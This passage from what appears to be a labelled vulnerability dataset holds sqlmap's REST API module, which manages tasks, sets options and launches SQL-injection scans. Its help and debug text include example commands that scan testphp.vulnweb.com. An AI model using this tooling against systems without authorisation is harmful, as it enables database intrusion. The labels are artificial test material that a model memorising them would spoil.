#\n#############################\n\n\n# Users' methods\n@get(\"/task/new\")\ndef task_new():\n    \"\"\"\n    Create new task ID\n    \"\"\"\n    taskid = hexencode(os.urandom(8))\n    remote_addr = request.remote_addr\n\n    DataStore.tasks[taskid] = Task(taskid, remote_addr)\n\n    logger.debug(\"Created new task: '%s'\" % taskid)\n    return jsonize({\"success\": True, \"taskid\": taskid})\n\n\n@get(\"/task/<taskid>/delete\")\ndef task_delete(taskid):\n    \"\"\"\n    Delete own task ID\n    \"\"\"\n    if taskid in DataStore.tasks:\n        DataStore.tasks.pop(taskid)\n\n        logger.debug(\"[%s] Deleted task\" % taskid)\n        return jsonize({\"success\": True})\n    else:\n        logger.warning(\"[%s] Invalid task ID provided to task_delete()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n###################\n# Admin functions #\n###################\n\n\n@get(\"/admin/<taskid>/list\")\ndef task_list(taskid=None):\n    \"\"\"\n    List task pull\n    \"\"\"\n    tasks = {}\n\n    for key in DataStore.tasks:\n        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:\n            tasks[key] = dejsonize(scan_status(key))[\"status\"]\n\n    logger.debug(\"[%s] Listed task pool (%s)\" % (taskid, \"admin\" if is_admin(taskid) else request.remote_addr))\n    return jsonize({\"success\": True, \"tasks\": tasks, \"tasks_num\": len(tasks)})\n\n@get(\"/admin/<taskid>/flush\")\ndef task_flush(taskid):\n    \"\"\"\n    Flush task spool (delete all tasks)\n    \"\"\"\n\n    for key in list(DataStore.tasks):\n        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:\n            DataStore.tasks[key].engine_kill()\n            del DataStore.tasks[key]\n\n    logger.debug(\"[%s] Flushed task pool (%s)\" % (taskid, \"admin\" if is_admin(taskid) else request.remote_addr))\n    return jsonize({\"success\": True})\n\n##################################\n# sqlmap core interact functions #\n##################################\n\n\n# Handle task's options\n@get(\"/option/<taskid>/list\")\ndef option_list(taskid):\n    \"\"\"\n    List options for a certain task ID\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to option_list()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    logger.debug(\"[%s] Listed task options\" % taskid)\n    return jsonize({\"success\": True, \"options\": DataStore.tasks[taskid].get_options()})\n\n\n@post(\"/option/<taskid>/get\")\ndef option_get(taskid):\n    \"\"\"\n    Get the value of an option (command line switch) for a certain task ID\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to option_get()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    option = request.json.get(\"option\", \"\")\n\n    if option in DataStore.tasks[taskid].options:\n        logger.debug(\"[%s] Retrieved value for option %s\" % (taskid, option))\n        return jsonize({\"success\": True, option: DataStore.tasks[taskid].get_option(option)})\n    else:\n        logger.debug(\"[%s] Requested value for unknown option %s\" % (taskid, option))\n        return jsonize({\"success\": False, \"message\": \"Unknown option\", option: \"not set\"})\n\n\n@post(\"/option/<taskid>/set\")\ndef option_set(taskid):\n    \"\"\"\n    Set an option (command line switch) for a certain task ID\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to option_set()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    for option, value in request.json.items():\n        DataStore.tasks[taskid].set_option(option, value)\n\n    logger.debug(\"[%s] Requested to set options\" % taskid)\n    return jsonize({\"success\": True})\n\n\n# Handle scans\n@post(\"/scan/<taskid>/start\")\ndef scan_start(taskid):\n    \"\"\"\n    Launch a scan\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_start()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    # Initialize sqlmap engine's options with user's provided options, if any\n    for option, value in request.json.items():\n        DataStore.tasks[taskid].set_option(option, value)\n\n    # Launch sqlmap engine in a separate process\n    DataStore.tasks[taskid].engine_start()\n\n    logger.debug(\"[%s] Started scan\" % taskid)\n    return jsonize({\"success\": True, \"engineid\": DataStore.tasks[taskid].engine_get_id()})\n\n\n@get(\"/scan/<taskid>/stop\")\ndef scan_stop(taskid):\n    \"\"\"\n    Stop a scan\n    \"\"\"\n    if (taskid not in DataStore.tasks or\n            DataStore.tasks[taskid].engine_process() is None or\n            DataStore.tasks[taskid].engine_has_terminated()):\n        logger.warning(\"[%s] Invalid task ID provided to scan_stop()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    DataStore.tasks[taskid].engine_stop()\n\n    logger.debug(\"[%s] Stopped scan\" % taskid)\n    return jsonize({\"success\": True})\n\n\n@get(\"/scan/<taskid>/kill\")\ndef scan_kill(taskid):\n    \"\"\"\n    Kill a scan\n    \"\"\"\n    if (taskid not in DataStore.tasks or\n            DataStore.tasks[taskid].engine_process() is None or\n            DataStore.tasks[taskid].engine_has_terminated()):\n        logger.warning(\"[%s] Invalid task ID provided to scan_kill()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    DataStore.tasks[taskid].engine_kill()\n\n    logger.debug(\"[%s] Killed scan\" % taskid)\n    return jsonize({\"success\": True})\n\n\n@get(\"/scan/<taskid>/status\")\ndef scan_status(taskid):\n    \"\"\"\n    Returns status of a scan\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_status()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    if DataStore.tasks[taskid].engine_process() is None:\n        status = \"not running\"\n    else:\n        status = \"terminated\" if DataStore.tasks[taskid].engine_has_terminated() is True else \"running\"\n\n    logger.debug(\"[%s] Retrieved scan status\" % taskid)\n    return jsonize({\n        \"success\": True,\n        \"status\": status,\n        \"returncode\": DataStore.tasks[taskid].engine_get_returncode()\n    })\n\n\n@get(\"/scan/<taskid>/data\")\ndef scan_data(taskid):\n    \"\"\"\n    Retrieve the data of a scan\n    \"\"\"\n    json_data_message = list()\n    json_errors_message = list()\n\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_data()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    # Read all data from the IPC database for the taskid\n    for status, content_type, value in DataStore.current_db.execute(\n            \"SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC\",\n            (taskid,)):\n        json_data_message.append(\n            {\"status\": status, \"type\": content_type, \"value\": dejsonize(value)})\n\n    # Read all error messages from the IPC database\n    for error in DataStore.current_db.execute(\n            \"SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC\",\n            (taskid,)):\n        json_errors_message.append(error)\n\n    logger.debug(\"[%s] Retrieved scan data and error messages\" % taskid)\n    return jsonize({\"success\": True, \"data\": json_data_message, \"error\": json_errors_message})\n\n\n# Functions to handle scans' logs\n@get(\"/scan/<taskid>/log/<start>/<end>\")\ndef scan_log_limited(taskid, start, end):\n    \"\"\"\n    Retrieve a subset of log messages\n    \"\"\"\n    json_log_messages = list()\n\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_log_limited()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    if not start.isdigit() or not end.isdigit() or end < start:\n        logger.warning(\"[%s] Invalid start or end value provided to scan_log_limited()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid start or end value, must be digits\"})\n\n    start = max(1, int(start))\n    end = max(1, int(end))\n\n    # Read a subset of log messages from the IPC database\n    for time_, level, message in DataStore.current_db.execute(\n            (\"SELECT time, level, message FROM logs WHERE \"\n             \"taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC\"),\n            (taskid, start, end)):\n        json_log_messages.append({\"time\": time_, \"level\": level, \"message\": message})\n\n    logger.debug(\"[%s] Retrieved scan log messages subset\" % taskid)\n    return jsonize({\"success\": True, \"log\": json_log_messages})\n\n\n@get(\"/scan/<taskid>/log\")\ndef scan_log(taskid):\n    \"\"\"\n    Retrieve the log messages\n    \"\"\"\n    json_log_messages = list()\n\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_log()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    # Read all log messages from the IPC database\n    for time_, level, message in DataStore.current_db.execute(\n            \"SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC\", (taskid,)):\n        json_log_messages.append({\"time\": time_, \"level\": level, \"message\": message})\n\n    logger.debug(\"[%s] Retrieved scan log messages\" % taskid)\n    return jsonize({\"success\": True, \"log\": json_log_messages})\n\n\n# Function to handle files inside the output directory\n@get(\"/download/<taskid>/<target>/<filename:path>\")\ndef download(taskid, target, filename):\n    \"\"\"\n    Download a certain file from the file system\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to download()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    path = os.path.abspath(os.path.join(paths.SQLMAP_OUTPUT_PATH, target, filename))\n    # Prevent file path traversal\n    if not path.startswith(paths.SQLMAP_OUTPUT_PATH):\n        logger.warning(\"[%s] Forbidden path (%s)\" % (taskid, target))\n        return jsonize({\"success\": False, \"message\": \"Forbidden path\"})\n\n    if os.path.isfile(path):\n        logger.debug(\"[%s] Retrieved content of file %s\" % (taskid, target))\n        with open(path, 'rb') as inf:\n            file_content = inf.read()\n        return jsonize({\"success\": True, \"file\": file_content.encode(\"base64\")})\n    else:\n        logger.warning(\"[%s] File does not exist %s\" % (taskid, target))\n        return jsonize({\"success\": False, \"message\": \"File does not exist\"})\n\n\ndef server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):\n    \"\"\"\n    REST-JSON API server\n    \"\"\"\n    DataStore.admin_id = hexencode(os.urandom(16))\n    Database.filepath = tempfile.mkstemp(prefix=\"sqlmapipc-\", text=False)[1]\n\n    logger.info(\"Running REST-JSON API server at '%s:%d'..\" % (host, port))\n    logger.info(\"Admin ID: %s\" % DataStore.admin_id)\n    logger.debug(\"IPC database: %s\" % Database.filepath)\n\n    # Initialize IPC database\n    DataStore.current_db = Database()\n    DataStore.current_db.connect()\n    DataStore.current_db.init()\n\n    # Run RESTful API\n    try:\n        if adapter == \"gevent\":\n            from gevent import monkey\n            monkey.patch_all()\n        elif adapter == \"eventlet\":\n            import eventlet\n            eventlet.monkey_patch()\n        logger.debug(\"Using adapter '%s' to run bottle\" % adapter)\n        run(host=host, port=port, quiet=True, debug=False, server=adapter)\n    except socket.error, ex:\n        if \"already in use\" in getSafeExString(ex):\n            logger.error(\"Address already in use ('%s:%s')\" % (host, port))\n        else:\n            raise\n    except ImportError:\n        errMsg = \"Adapter '%s' is not available on this system\" % adapter\n        if adapter in (\"gevent\", \"eventlet\"):\n            errMsg += \" (e.g.: 'sudo apt-get install python-%s')\" % adapter\n        logger.critical(errMsg)\n\ndef _client(url, options=None):\n    logger.debug(\"Calling %s\" % url)\n    try:\n        data = None\n        if options is not None:\n            data = jsonize(options)\n        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})\n        response = urllib2.urlopen(req)\n        text = response.read()\n    except:\n        if options:\n            logger.error(\"Failed to load and parse %s\" % url)\n        raise\n    return text\n\n\ndef client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):\n    \"\"\"\n    REST-JSON API client\n    \"\"\"\n\n    dbgMsg = \"Example client access from command line:\"\n    dbgMsg += \"\\n\\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\\{16\\}') && echo $taskid\" % (host, port)\n    dbgMsg += \"\\n\\t$ curl -H \\\"Content-Type: application/json\\\" -X POST -d '{\\\"url\\\": \\\"http://testphp.vulnweb.com/artists.php?artist=1\\\"}' http://%s:%d/scan/$taskid/start\" % (host, port)\n    dbgMsg += \"\\n\\t$ curl http://%s:%d/scan/$taskid/data\" % (host, port)\n    dbgMsg += \"\\n\\t$ curl http://%s:%d/scan/$taskid/log\" % (host, port)\n    logger.debug(dbgMsg)\n\n    addr = \"http://%s:%d\" % (host, port)\n    logger.info(\"Starting REST-JSON API client to '%s'...\" % addr)\n\n    try:\n        _client(addr)\n    except Exception, ex:\n        if not isinstance(ex, urllib2.HTTPError):\n            errMsg = \"There has been a problem while connecting to the \"\n            errMsg += \"REST-JSON API server at '%s' \" % addr\n            errMsg += \"(%s)\" % ex\n            logger.critical(errMsg)\n            return\n\n    taskid = None\n    logger.info(\"Type 'help' or '?' for list of available commands\")\n\n    while True:\n        try:\n            command = raw_input(\"api%s> \" % (\" (%s)\" % taskid if taskid else \"\")).strip().lower()\n        except (EOFError, KeyboardInterrupt):\n            print\n            break\n\n        if command in (\"data\", \"log\", \"status\", \"stop\", \"kill\"):\n            if not taskid:\n                logger.error(\"No task ID in use\")\n                continue\n            raw = _client(\"%s/scan/%s/%s\" % (addr, taskid, command))\n            res = dejsonize(raw)\n            if not res[\"success\"]:\n                logger.error(\"Failed to execute command %s\" % command)\n            dataToStdout(\"%s\\n\" % raw)\n\n        elif command.startswith(\"new\"):\n            if ' ' not in command:\n                logger.error(\"Program arguments are missing\")\n                continue\n\n            argv = [\"sqlmap.py\"] + shlex.split(command)[1:]\n\n            try:\n                cmdLineOptions = cmdLineParser(argv).__dict__\n            except:\n                taskid = None\n                continue\n\n            for key in list(cmdLineOptions):\n                if cmdLineOptions[key] is None:\n                    del cmdLineOptions[key]\n\n            raw = _client(\"%s/task/new\" % addr)\n            res = dejsonize(raw)\n            if not res[\"success\"]:\n                logger.error(\"Failed to create new task\")\n                continue\n            taskid = res[\"taskid\"]\n            logger.info(\"New task ID is '%s'\" % taskid)\n\n            raw = _client(\"%s/scan/%s/start\" % (addr, taskid), cmdLineOptions)\n            res = dejsonize(raw)\n            if not res[\"success\"]:\n                logger.error(\"Failed to start scan\")\n                continue\n            logger.info(\"Scanning started\")\n\n        elif command.startswith(\"use\"):\n            taskid = (command.split()[1] if ' ' in command else \"\").strip(\"'\\\"\")\n            if not taskid:\n                logger.error(\"Task ID is missing\")\n                taskid = None\n                continue\n            elif not re.search(r\"\\A[0-9a-fA-F]{16}\\Z\", taskid):\n                logger.error(\"Invalid task ID '%s'\" % taskid)\n                taskid = None\n                continue\n            logger.info(\"Switching to task ID '%s' \" % taskid)\n\n        elif command in (\"list\", \"flush\"):\n            raw = _client(\"%s/admin/%s/%s\" % (addr, taskid or 0, command))\n            res = dejsonize(raw)\n            if not res[\"success\"]:\n                logger.error(\"Failed to execute command %s\" % command)\n            elif command == \"flush\":\n                taskid = None\n            dataToStdout(\"%s\\n\" % raw)\n\n        elif command in (\"exit\", \"bye\", \"quit\", 'q'):\n            return\n\n        elif command in (\"help\", \"?\"):\n            msg =  \"help        Show this help message\\n\"\n            msg += \"new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \\\"http://testphp.vulnweb.com/artists.php?artist=1\\\"')\\n\"\n            msg += \"use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\\n\"\n            msg += \"data        Retrieve and show data for current task\\n\"\n            msg += \"log         Retrieve and show log for current task\\n\"\n            msg += \"status      Retrieve and show status for current task\\n\"\n            msg += \"stop        Stop current task\\n\"\n            msg += \"kill        Kill current task\\n\"\n            msg += \"list        Display all tasks\\n\"\n            msg += \"flush       Flush tasks (delete all tasks)\\n\"\n            msg += \"exit        Exit this client\\n\"\n\n            dataToStdout(msg)\n\n        elif command:\n            logger.error(\"Unknown command '%s'\" % command)\n/n/n/n", "label": 0, "vtype": "path_disclosure"}, {"id": "b4bb4c393b26072b9a47f787be134888b983af60", "code": "/lib/utils/api.py/n/n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\"\"\"\nCopyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)\nSee the file 'doc/COPYING' for copying permission\n\"\"\"\n\nimport logging\nimport os\nimport re\nimport shlex\nimport socket\nimport sqlite3\nimport sys\nimport tempfile\nimport time\nimport urllib2\n\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.convert import base64pickle\nfrom lib.core.convert import hexencode\nfrom lib.core.convert import dejsonize\nfrom lib.core.convert import jsonize\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import paths\nfrom lib.core.data import logger\nfrom lib.core.datatype import AttribDict\nfrom lib.core.defaults import _defaults\nfrom lib.core.enums import CONTENT_STATUS\nfrom lib.core.enums import PART_RUN_CONTENT_TYPES\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.log import LOGGER_HANDLER\nfrom lib.core.optiondict import optDict\nfrom lib.core.settings import RESTAPI_DEFAULT_ADAPTER\nfrom lib.core.settings import IS_WIN\nfrom lib.core.settings import RESTAPI_DEFAULT_ADDRESS\nfrom lib.core.settings import RESTAPI_DEFAULT_PORT\nfrom lib.core.subprocessng import Popen\nfrom lib.parse.cmdline import cmdLineParser\nfrom thirdparty.bottle.bottle import error as return_error\nfrom thirdparty.bottle.bottle import get\nfrom thirdparty.bottle.bottle import hook\nfrom thirdparty.bottle.bottle import post\nfrom thirdparty.bottle.bottle import request\nfrom thirdparty.bottle.bottle import response\nfrom thirdparty.bottle.bottle import run\n\n\n# global settings\nclass DataStore(object):\n    admin_id = \"\"\n    current_db = None\n    tasks = dict()\n\n\n# API objects\nclass Database(object):\n    filepath = None\n\n    def __init__(self, database=None):\n        self.database = self.filepath if database is None else database\n        self.connection = None\n        self.cursor = None\n\n    def connect(self, who=\"server\"):\n        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)\n        self.cursor = self.connection.cursor()\n        logger.debug(\"REST-JSON API %s connected to IPC database\" % who)\n\n    def disconnect(self):\n        if self.cursor:\n            self.cursor.close()\n\n        if self.connection:\n            self.connection.close()\n\n    def commit(self):\n        self.connection.commit()\n\n    def execute(self, statement, arguments=None):\n        while True:\n            try:\n                if arguments:\n                    self.cursor.execute(statement, arguments)\n                else:\n                    self.cursor.execute(statement)\n            except sqlite3.OperationalError, ex:\n                if not \"locked\" in getSafeExString(ex):\n                    raise\n            else:\n                break\n\n        if statement.lstrip().upper().startswith(\"SELECT\"):\n            return self.cursor.fetchall()\n\n    def init(self):\n        self.execute(\"CREATE TABLE logs(\"\n                  \"id INTEGER PRIMARY KEY AUTOINCREMENT, \"\n                  \"taskid INTEGER, time TEXT, \"\n                  \"level TEXT, message TEXT\"\n                  \")\")\n\n        self.execute(\"CREATE TABLE data(\"\n                  \"id INTEGER PRIMARY KEY AUTOINCREMENT, \"\n                  \"taskid INTEGER, status INTEGER, \"\n                  \"content_type INTEGER, value TEXT\"\n                  \")\")\n\n        self.execute(\"CREATE TABLE errors(\"\n                    \"id INTEGER PRIMARY KEY AUTOINCREMENT, \"\n                    \"taskid INTEGER, error TEXT\"\n                    \")\")\n\n\nclass Task(object):\n    def __init__(self, taskid, remote_addr):\n        self.remote_addr = remote_addr\n        self.process = None\n        self.output_directory = None\n        self.options = None\n        self._original_options = None\n        self.initialize_options(taskid)\n\n    def initialize_options(self, taskid):\n        datatype = {\"boolean\": False, \"string\": None, \"integer\": None, \"float\": None}\n        self.options = AttribDict()\n\n        for _ in optDict:\n            for name, type_ in optDict[_].items():\n                type_ = unArrayizeValue(type_)\n                self.options[name] = _defaults.get(name, datatype[type_])\n\n        # Let sqlmap engine knows it is getting called by the API,\n        # the task ID and the file path of the IPC database\n        self.options.api = True\n        self.options.taskid = taskid\n        self.options.database = Database.filepath\n\n        # Enforce batch mode and disable coloring and ETA\n        self.options.batch = True\n        self.options.disableColoring = True\n        self.options.eta = False\n\n        self._original_options = AttribDict(self.options)\n\n    def set_option(self, option, value):\n        self.options[option] = value\n\n    def get_option(self, option):\n        return self.options[option]\n\n    def get_options(self):\n        return self.options\n\n    def reset_options(self):\n        self.options = AttribDict(self._original_options)\n\n    def engine_start(self):\n        if os.path.exists(\"sqlmap.py\"):\n            self.process = Popen([\"python\", \"sqlmap.py\", \"--pickled-options\", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)\n        else:\n            self.process = Popen([\"sqlmap\", \"--pickled-options\", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)\n\n    def engine_stop(self):\n        if self.process:\n            self.process.terminate()\n            return self.process.wait()\n        else:\n            return None\n\n    def engine_process(self):\n        return self.process\n\n    def engine_kill(self):\n        if self.process:\n            try:\n                self.process.kill()\n                return self.process.wait()\n            except:\n                pass\n        return None\n\n    def engine_get_id(self):\n        if self.process:\n            return self.process.pid\n        else:\n            return None\n\n    def engine_get_returncode(self):\n        if self.process:\n            self.process.poll()\n            return self.process.returncode\n        else:\n            return None\n\n    def engine_has_terminated(self):\n        return isinstance(self.engine_get_returncode(), int)\n\n\n# Wrapper functions for sqlmap engine\nclass StdDbOut(object):\n    def __init__(self, taskid, messagetype=\"stdout\"):\n        # Overwrite system standard output and standard error to write\n        # to an IPC database\n        self.messagetype = messagetype\n        self.taskid = taskid\n\n        if self.messagetype == \"stdout\":\n            sys.stdout = self\n        else:\n            sys.stderr = self\n\n    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):\n        if self.messagetype == \"stdout\":\n            if content_type is None:\n                if kb.partRun is not None:\n                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)\n                else:\n                    # Ignore all non-relevant messages\n                    return\n\n            output = conf.database_cursor.execute(\n                \"SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?\",\n                (self.taskid, content_type))\n\n            # Delete partial output from IPC database if we have got a complete output\n            if status == CONTENT_STATUS.COMPLETE:\n                if len(output) > 0:\n                    for index in xrange(len(output)):\n                        conf.database_cursor.execute(\"DELETE FROM data WHERE id = ?\",\n                                                     (output[index][0],))\n\n                conf.database_cursor.execute(\"INSERT INTO data VALUES(NULL, ?, ?, ?, ?)\",\n                                             (self.taskid, status, content_type, jsonize(value)))\n                if kb.partRun:\n                    kb.partRun = None\n\n            elif status == CONTENT_STATUS.IN_PROGRESS:\n                if len(output) == 0:\n                    conf.database_cursor.execute(\"INSERT INTO data VALUES(NULL, ?, ?, ?, ?)\",\n                                                 (self.taskid, status, content_type,\n                                                  jsonize(value)))\n                else:\n                    new_value = \"%s%s\" % (dejsonize(output[0][2]), value)\n                    conf.database_cursor.execute(\"UPDATE data SET value = ? WHERE id = ?\",\n                                                 (jsonize(new_value), output[0][0]))\n        else:\n            conf.database_cursor.execute(\"INSERT INTO errors VALUES(NULL, ?, ?)\",\n                                         (self.taskid, str(value) if value else \"\"))\n\n    def flush(self):\n        pass\n\n    def close(self):\n        pass\n\n    def seek(self):\n        pass\n\n\nclass LogRecorder(logging.StreamHandler):\n    def emit(self, record):\n        \"\"\"\n        Record emitted events to IPC database for asynchronous I/O\n        communication with the parent process\n        \"\"\"\n        conf.database_cursor.execute(\"INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)\",\n                                     (conf.taskid, time.strftime(\"%X\"), record.levelname,\n                                      record.msg % record.args if record.args else record.msg))\n\n\ndef setRestAPILog():\n    if hasattr(conf, \"api\"):\n        try:\n            conf.database_cursor = Database(conf.database)\n            conf.database_cursor.connect(\"client\")\n        except sqlite3.OperationalError, ex:\n            raise SqlmapConnectionException, \"%s ('%s')\" % (ex, conf.database)\n\n        # Set a logging handler that writes log messages to a IPC database\n        logger.removeHandler(LOGGER_HANDLER)\n        LOGGER_RECORDER = LogRecorder()\n        logger.addHandler(LOGGER_RECORDER)\n\n\n# Generic functions\ndef is_admin(taskid):\n    return DataStore.admin_id == taskid\n\n\n@hook(\"after_request\")\ndef security_headers(json_header=True):\n    \"\"\"\n    Set some headers across all HTTP responses\n    \"\"\"\n    response.headers[\"Server\"] = \"Server\"\n    response.headers[\"X-Content-Type-Options\"] = \"nosniff\"\n    response.headers[\"X-Frame-Options\"] = \"DENY\"\n    response.headers[\"X-XSS-Protection\"] = \"1; mode=block\"\n    response.headers[\"Pragma\"] = \"no-cache\"\n    response.headers[\"Cache-Control\"] = \"no-cache\"\n    response.headers[\"Expires\"] = \"0\"\n    if json_header:\n        response.content_type = \"application/json; charset=UTF-8\"\n\n##############################\n# HTTP Status Code functions #\n##############################\n\n\n@return_error(401)  # Access Denied\ndef error401(error=None):\n    security_headers(False)\n    return \"Access denied\"\n\n\n@return_error(404)  # Not Found\ndef error404(error=None):\n    security_headers(False)\n    return \"Nothing here\"\n\n\n@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)\ndef error405(error=None):\n    security_headers(False)\n    return \"Method not allowed\"\n\n\n@return_error(500)  # Internal Server Error\ndef error500(error=None):\n    security_headers(False)\n    return \"Internal server error\"\n\n#############################\n# Task management functions #\n#############################\n\n\n# Users' methods\n@get(\"/task/new\")\ndef task_new():\n    \"\"\"\n    Create new task ID\n    \"\"\"\n    taskid = hexencode(os.urandom(8))\n    remote_addr = request.remote_addr\n\n    DataStore.tasks[taskid] = Task(taskid, remote_addr)\n\n    logger.debug(\"Created new task: '%s'\" % taskid)\n    return jsonize({\"success\": True, \"taskid\": taskid})\n\n\n@get(\"/task/<taskid>/delete\")\ndef task_delete(taskid):\n    \"\"\"\n    Delete own task ID\n    \"\"\"\n    if taskid in DataStore.tasks:\n        DataStore.tasks.pop(taskid)\n\n        logger.debug(\"[%s] Deleted task\" % taskid)\n        return jsonize({\"success\": True})\n    else:\n        logger.warning(\"[%s] Invalid task ID provided to task_delete()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n###################\n# Admin functions #\n###################\n\n\n@get(\"/admin/<taskid>/list\")\ndef task_list(taskid=None):\n    \"\"\"\n    List task pull\n    \"\"\"\n    tasks = {}\n\n    for key in DataStore.tasks:\n        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:\n            tasks[key] = dejsonize(scan_status(key))[\"status\"]\n\n    logger.debug(\"[%s] Listed task pool (%s)\" % (taskid, \"admin\" if is_admin(taskid) else request.remote_addr))\n    return jsonize({\"success\": True, \"tasks\": tasks, \"tasks_num\": len(tasks)})\n\n@get(\"/admin/<taskid>/flush\")\ndef task_flush(taskid):\n    \"\"\"\n    Flush task spool (delete all tasks)\n    \"\"\"\n\n    for key in list(DataStore.tasks):\n        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:\n            DataStore.tasks[key].engine_kill()\n            del DataStore.tasks[key]\n\n    logger.debug(\"[%s] Flushed task pool (%s)\" % (taskid, \"admin\" if is_admin(taskid) else request.remote_addr))\n    return jsonize({\"success\": True})\n\n##################################\n# sqlmap core interact functions #\n##################################\n\n\n# Handle task's options\n@get(\"/option/<taskid>/list\")\ndef option_list(taskid):\n    \"\"\"\n    List options for a certain task ID\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to option_list()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    logger.debug(\"[%s] Listed task options\" % taskid)\n    return jsonize({\"success\": True, \"options\": DataStore.tasks[taskid].get_options()})\n\n\n@post(\"/option/<taskid>/get\")\ndef option_get(taskid):\n    \"\"\"\n    Get the value of an option (command line switch) for a certain task ID\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to option_get()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    option = request.json.get(\"option\", \"\")\n\n    if option in DataStore.tasks[taskid].options:\n        logger.debug(\"[%s] Retrieved value for option %s\" % (taskid, option))\n        return jsonize({\"success\": True, option: DataStore.tasks[taskid].get_option(option)})\n    else:\n        logger.debug(\"[%s] Requested value for unknown option %s\" % (taskid, option))\n        return jsonize({\"success\": False, \"message\": \"Unknown option\", option: \"not set\"})\n\n\n@post(\"/option/<taskid>/set\")\ndef option_set(taskid):\n    \"\"\"\n    Set an option (command line switch) for a certain task ID\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to option_set()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    for option, value in request.json.items():\n        DataStore.tasks[taskid].set_option(option, value)\n\n    logger.debug(\"[%s] Requested to set options\" % taskid)\n    return jsonize({\"success\": True})\n\n\n# Handle scans\n@post(\"/scan/<taskid>/start\")\ndef scan_start(taskid):\n    \"\"\"\n    Launch a scan\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_start()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    # Initialize sqlmap engine's options with user's provided options, if any\n    for option, value in request.json.items():\n        DataStore.tasks[taskid].set_option(option, value)\n\n    # Launch sqlmap engine in a separate process\n    DataStore.tasks[taskid].engine_start()\n\n    logger.debug(\"[%s] Started scan\" % taskid)\n    return jsonize({\"success\": True, \"engineid\": DataStore.tasks[taskid].engine_get_id()})\n\n\n@get(\"/scan/<taskid>/stop\")\ndef scan_stop(taskid):\n    \"\"\"\n    Stop a scan\n    \"\"\"\n    if (taskid not in DataStore.tasks or\n            DataStore.tasks[taskid].engine_process() is None or\n            DataStore.tasks[taskid].engine_has_terminated()):\n        logger.warning(\"[%s] Invalid task ID provided to scan_stop()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    DataStore.tasks[taskid].engine_stop()\n\n    logger.debug(\"[%s] Stopped scan\" % taskid)\n    return jsonize({\"success\": 